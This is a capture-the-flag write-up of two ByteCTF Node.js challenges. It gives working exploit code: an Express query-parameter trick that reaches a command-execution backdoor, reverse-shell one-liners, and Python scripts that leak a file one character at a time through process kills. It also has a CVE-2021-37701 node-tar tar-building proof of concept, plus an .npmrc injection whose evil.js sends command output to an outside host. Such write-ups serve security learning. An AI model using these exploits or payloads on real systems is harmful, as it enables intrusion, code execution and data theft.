# Record of Node question in ByteCTF

I always feel like Byte has some grudge against `Node`. In both the preliminary and final rounds, there was a `Node` question. Of course, `PHP` and `Java` are indispensable, but I feel that `Node` questions are relatively rare, so it feels quite fresh.

## Nothing

In the final round, the `Node` question was as follows:
```
Can you get the flag in a fully enclosed Node.js environment?

http://39.106.69.116:30001
http://39.106.34.228:30001
```
Directly accessing `http://39.106.34.228:30001/` will yield the phrase `Here is a backdoor, can you shell it and get the flag?`, while accessing `http://39.106.34.228:30001/source` will provide the relevant source code.

```javascript
const express = require('express')
const fs = require('fs')
const exec = require('child_process').exec;
const src = fs.readFileSync("app.js")
const app = express()

app.get('/', (req, res) => {
    if (!('ByteCTF' in req.query)) {
        res.end("Here is a backdoor, can you shell it and get the flag?")
        return
    }

    if (req.query.ByteCTF.length > 3000) {
        const byteCTF = JSON.stringify(req.query.ByteCTF)
        if (byteCTF.length > 1024) {
            res.end("too long.")
            return
        }

        try {
            const q = "{" + req.query.ByteCTF + "}"
            res.end("Got it!")
        } catch {
            if (req.query.backdoor) {
                exec(req.query.backdoor)
                res.send("exec complete, but nothing here")
            } else {
                res.end("Nothing here!")
            }
        }
    } else {
        res.end("too short.")
        return
    }
})

app.get('/source', (req, res) => {
    res.end(src)
});

app.listen(3000, () => {
  console.log(`listening at port 3000`)
}) 
```

As you can see, there is an `exec` that can execute commands, and then it's the classic evasion step. First, we need the length to be greater than `3000` and after `JSON.stringify` it should be less than `1024`, which puzzled me. Then, a colleague said that this thing can directly transmit objects. So, with a `length` attribute value greater than `3000`, it's fine. Wow, I didn't know `express` could directly transmit objects. So, I decided to run it locally first. First, save the code as `app.js`, and then run the command in the local directory.

```shell
$ npm install express
$ node app.js
```

Then, let's try printing `req.query.ByteCTF` and visit `http://localhost:3000/?ByteCTF[a]=1&ByteCTF[b]=2`, to get an object output.

```javascript
// http://localhost:3000/?ByteCTF[a]=1&ByteCTF[b]=2
// too short.
{ a: '1', b: '2' }
```

Since it can be converted into an object, we can directly write an object with a `length` attribute into it, so that when it checks the `length`, it's greater than `3000`.

```javascript
// http://localhost:3000/?ByteCTF[__proto__][length]=100000&ByteCTF[a]=1
// Got it!
{ a: '1' }
```

You can see that the output is `Got it!`, which means that the code successfully executed the line `res.end("Got it!")`. Now, all we need to do is to make this object throw an exception when concatenating strings. In JavaScript, when an object is converted to a string, the `toString` method is called. Since we're passing an object, we can completely override this method by passing a value directly. Because we're not passing a function, an exception will be thrown when the `toString` function is attempted to be called during concatenation.

```javascript
// http://localhost:3000/?ByteCTF[__proto__][length]=100000&ByteCTF[a]=1&ByteCTF[toString]=1
// Throws an exception: TypeError: Cannot convert object to primitive value
// Nothing here!
```

As you can see, the output is `Nothing here!`. Then, all we need to do is to pass a `backdoor` parameter to execute commands.

```javascript
// http://localhost:3000/?ByteCTF[__proto__][length]=100000&ByteCTF[a]=1&ByteCTF[toString]=1&backdoor=echo%201
// Exec complete, but nothing here
```

So far, things seem to be going well, but just seemingly. At first, I couldn't quite understand what "fully enclosed" meant in the challenge. I tried to use `nc -e /bin/bash {host} {port}` to bounce a shell, but got no response for a while. I figured that perhaps the distribution didn't support the `-e` parameter. So, I attempted `bash -i >& /dev/tcp/{host}/{port} 0>&1`, but that didn't work either. Then, I checked my machine's `nc -lvvp {port}` and it seemed fine. Next, I tried `dnslog` and attempted to use `curl` and `ping`, but didn't receive any records. That's when I finally understood what "fully enclosed" meant – the target machine had no internet access. I could perform an RCE, but couldn't retrieve anything, which was frustrating. Then, I thought about killing the `node` process and using that port for communication, or checking if there were any other available ports. Then, my teammate came up with a new trick, which left me stunned.

Before we move on, I remember seeing a piece of code before. The specific details are a bit fuzzy... I found the original link in the references section and will basically just relay it here.

```java
boolean safeEqual(String a, String b) {
   if (a == null || b == null) {
       return a == b;
   }
   if (a.length() != b.length()) {
       return false;
   }
   int equal = 0;
   for (int i = 0; i < a.length(); i++) {
       equal |= a.charAt(i) ^ b.charAt(i);
   }
   return equal == 0;
}
```

This function compares two strings for equality. If the lengths are different, the result is clearly inequal and can be immediately returned. Looking at the rest of the code, with a little mental gymnastics, you can understand the subtlety here: by using the XOR operation (`1^1=0`, `1^0=1`, `0^0=0`) to compare each bit, if every bit is equal, then the two strings are definitely equal, and the accumulated XOR value stored in the `equal` variable must be `0`; otherwise, it will be `1`. However, from an efficiency point of view, isn't it more efficient to immediately return that the two strings are not equal as soon as we find a different result (i.e., `1`) in the middle, similar to this:

```java
for (int i = 0; i < a.length(); i++) {
    if (a.charAt(i) ^ b.charAt(i) != 0) // or a.charAt(i) != b.charAt(i)
        return false;
}
```
I've known about using delayed calculations and other means to improve efficiency, but this is the first time I've encountered delaying the return of a calculation that has already been made. Considering the method name `safeEquals`, we might have an idea related to security, which is actually present in similar methods in the JDK, such as `java.security.MessageDigest`, which is meant for performing constant time complexity comparisons.

```java
public static boolean isEqual(byte[] digesta, byte[] digestb) {
   if (digesta == digestb) return true;
   if (digesta == null || digestb == null) {
       return false;
   }
   if (digesta.length != digestb.length) {
       return false;
   }
   // ... (Content continues)
```

```java
int result = 0;
// time-constant comparison
for (int i = 0; i < digesta.length; i++) {
    result |= digesta[i] ^ digestb[i];
}
return result == 0;
}
```

In fact, doing this is to prevent timing attacks. A timing attack is a type of side-channel attack (also known as Side Channel Attack, abbreviated as SCA), which is a kind of attack that takes advantage of software or hardware design flaws in a sneaky way.

Then, the folks played a fancy side-channel attack scheme, haha. First of all, since they couldn't get out of the network, they needed to know the status of a server. The server status chosen by the folks is whether the `node` process is still alive. The overall idea is to first read a file in the root directory, and the `flag` is probably in the file. By executing `ls /` to get an output string, then we pass in a piece of code. If this character is the same as the one we passed in, the `node` process is killed, and then we can't access the service. Then we can determine that this character is correct, and the passed-in characters can only be traversed one by one. First, we need to traverse and retrieve the file that stores the `flag`. Now let's get to the code, this is actually a kind of brute-force solution. In the process of attempting, some situations may occur, because the target machine's `node` restarts too quickly after being killed, so it needs a lot of manual intervention to check. Sometimes it will pause and look a few more times, and probably that character is the correct one. Looking a few more times can eliminate network fluctuation factors.

```python
# blast_file_name.py Brute force file name

import requests
from urllib import parse
import base64
from time import sleep
import string

# url = "http://39.106.69.116:30001/"
url = "http://39.106.34.228:30001/"

template = '''
    const exec = require("child_process").exec;
    const fs = require("fs");
    const cmd = "ls /";

    exec(cmd, function(error, stdout, stderr) {{ 
        if (stdout[{0}] === "{1}" && stdout.substr(0, {0}) === "{2}") {{
            exec("pkill node");
        }}
    }});
'''


def remote_exec(command):
    params = "echo {} | base64 -d > /tmp/ddd.js;node /tmp/ddd.js".format(base64.b64encode(t.encode()).replace(b'\n', b'').decode())
    # print(params)
    requests.get(url + "?ByteCTF[__proto__][length]=100000&ByteCTF[toString]=&ByteCTF[][a]&backdoor=" + parse.quote(params))

if __name__ == "__main__":
    # For example, if the fourth character is found
    # Then the third one is probably correct
    # Needs a lot of manual judgment
    result = ""
    result = "T"
    result = "Th1s_1s"
    for i in range(len(result), 10000000):
        find = False
        for char in string.ascii_letters + "_- " + string.digits:
            print(i, len(result), char, result + char)
            t = template.format(len(result), char, result)
            # print(t)

            try:
                remote_exec(t)
            except:
                continue

            try:
                requests.get(url, timeout=5)
                requests.get(url, timeout=5)
                requests.get(url, timeout=5)
            except:
                find = True
                result += char
                print(result)
                sleep(5)
                break
```

```python
# blasting_flag.py - Blasting the `flag`

import requests
from urllib import parse
import base64
from time import sleep
import string

# url = "http://39.106.69.116:30001/"
url = "http://39.106.34.228:30001/"

template = '''
    const exec = require("child_process").exec;
    const fs = require("fs");
    const cmd = "cat /Th1s_1s*";

    exec(cmd, function(error, stdout, stderr) {{ 
        if(stdout[{0}]==="{1}" && stdout.substr(0,{0})==="{2}"){{
            exec("pkill node");
        }}
    }});
'''


def remote_exec(command):
    params = "echo {} | base64 -d > /tmp/hhh.js;node /tmp/hhh.js".format(base64.b64encode(t.encode()).replace(b'\n',b'').decode())
    # print(params)
    requests.get(url +"?ByteCTF[__proto__][length]=100000&ByteCTF[toString]=&ByteCTF[][a]&backdoor="+parse.quote(params))

if __name__ == "__main__":
    # For example, if the fourth character is found, then the third character is probably correct
    # It requires a lot of human factors. Sometimes it pauses for a while and looks a few more times. It's probably there because the node restarts too quickly. Looking a few more times can exclude network fluctuations factors
    result = ""
    result = "by"
    result = "bytectf{50579195da002fa989432cbc1a83e38f5d3765122d9a7d4d767f99a61fa58f22"
    for i in range(len(result), 10000000):
        find = False
        # for char in string.ascii_letters:
        for char in string.ascii_letters + "{_- }" + string.digits:
            print(i, len(result), char, result + char)
            t = template.format(len(result), char, result)
            # print(t)

            try:
                remote_exec(t)
            except:
                continue

            try:
                requests.get(url, timeout=1)
                requests.get(url, timeout=1)
                requests.get(url, timeout=1)
            except:
                find = True
                result += char
                print(result)
                sleep(5)
                break

        if not find:
            result += ""

# The flag obtained is: bytectf{50579195da002fa989432cbc1a83e38f5d3765122d9a7d4d767f99a61fa58f22}
```

## easy_extract
This is the `Node` topic of the preliminary contest. At that time, I couldn't figure it out. After the final contest, I saw the `Node` topic above, so I also recorded it. At that moment, I managed to write to files, but there weren't many places with write permissions. I didn't expect to use the `.npmrc` file to write and then restart the tool. The following content is from the official `Writeup`, just for record. Details are provided in the reference link.

This topic uses the bypass vulnerability of the `node-tar` package's symbol link check, which was reported in August. The vulnerability itself can be found online with a `POC`, allowing arbitrary file writing. At the same time, this topic demonstrates the functionality of listing files combined with symbol links to be used for directory listing, assisting in determining the topic environment. However, for the sake of difficulty, the `Dockerfile` is exposed in the `/robots.txt`, providing some information on how the topic is started. Additionally, this topic also examines some ideas on causing `RCE` through arbitrary file writing without `web` application directory write permissions.
`CVE-2021-37701 node-tar` Arbitrary file write `/` override vulnerability (translated from the original report). `node-tar` has security measures aimed at ensuring that no files are extracted that have been modified by symbol links. This is achieved by ensuring that the extracted directory is not a symbol link. In addition, to prevent unnecessary `stat` calls to determine if a given path is a directory, the path is cached when creating the directory. However, in versions below `6.1.7` of `node-tar`, when a `tar` file containing a directory and a symbol link with the same name as the directory is extracted, this check logic is not sufficient. The symbol link and directory name in the archived entry use a backslash as the path separator on `posix` systems, while the cache check logic simultaneously uses the `/` character as the path separator. However, on `posix` systems, this is a valid file name character. By first creating a directory and then replacing it with a symbol link, it is possible to bypass the symbol link check for directories, essentially allowing untrusted `tar` files to symbolically link to any location and then extract any file to that location, thereby allowing arbitrary file creation and override. In addition, case-insensitive file systems may experience similar confusion. If a malicious `tar` contains a directory named `FOO`, followed by a symbolic link named `foo`, on a case-insensitive file system, the creation of the symbol link will remove the directory from the file system, but not from the internal directory because it will not be considered a cache hit. Subsequent file entries in the `FOO` directory will be placed in the target of the symbol link, assuming the directory has already been created. There are related articles that can be referred for the construction of a `POC`: 5 RCEs in npm for $15, 000. Therefore, we tried it out, but we found that there was a file size limit during the upload. Generally, files packaged with `tar` will be larger than `1KB`, so we can package a `.tar.gz` and change the extension back to `.tar`. In fact, `node-tar` does not determine file compression based on the extension, so files with a `.tar` extension can be properly unpacked. We found that a symbolic link pointing to outside of `/app/data` was indeed created, allowing for the listing of full paths:

```bash
#!/bin/sh

rm n\\x

ln -s / n\\x # Create a link to the destination dir
tar cf poc.tar n\\x # Pack the link into the tar

echo "test" > n\\x/app/data/test
tar rf poc.tar n\\x n\\x/app/data/test

gzip -9 < poc.tar > poc.tar.gz
rm poc.tar
mv poc.tar.gz poc.tar
```

After completing this step, it is possible to list directories arbitrarily and write files arbitrarily. There is a `/readflag` in the root directory, indicating the need for command execution.

From the `Dockerfile`, we can see that our user is `node`, and there are hardly any places with write permissions. Also, except for `/app/data`, the `app` directory does not have write permission. Observing the startup parameters, `nodemon --exec npm start`, is somewhat odd. Research reveals that `nodemon` is a development tool that automatically restarts `node` when files are created or changed in the `/app` directory. Therefore, we can also write a configuration file in the user's folder, which will be loaded when `node` is restarted. We noticed that the service is started using `npm start`, so we can cause `RCE` by writing to the `NODE_OPTIONS` parameter in `~/.npmrc`.

```bash
echo "node-options='--require /home/node/evil.js'" > /home/node/.npmrc
```

Then, write a `.js` file to `/app/data`, which triggers `nodemon` to restart `node`, thereby causing `evil.js` to be executed. The purpose of `nodemon` is mainly for convenience during the competition. In practice, it is highly unlikely for someone to use `nodemon` to start production services. Nevertheless, we can still write files first and then wait patiently until the service restarts and the command is executed. In a `Docker` container with a configured restart strategy, you can also force a restart by crashing the service.


# Generate Tar
```
mkdir /home/node
ln -s /home/node/ n\\x
tar cf exp.tar n\\x
echo "node-options='--require /home/node/evil.js'" > n\\x/.npmrc
echo "const execSync = require('child_process').execSync;const http = require('http');const output = execSync('/readflag', { encoding: 'utf-8' });http.get('http://ent9hso2vt0z.x.pipedream.net/?'+output);" > n\\x/evil.js
echo "dummy" > test.js
tar rf exp.tar n\\x n\\x/.npmrc n\\x/evil.js test.js
```

# Compress
```
gzip -9 < exp.tar > exp.tar.gz
mv exp.tar.gz exp.tar
```

# Clean Up
```
rm n\\x/.npmrc n\\x/evil.js test.js n\\x
rm -r /home/node
```

## References
```
https://www.zhihu.com/question/275611095/answer/1962679419
https://bytedance.feishu.cn/docs/doccntSbxsYPGEXw7wLP0TY73df
https://bytectf.feishu.cn/docs/doccnq7Z5hqRBMvrmpRQMAGEK4e#lLBgbe
```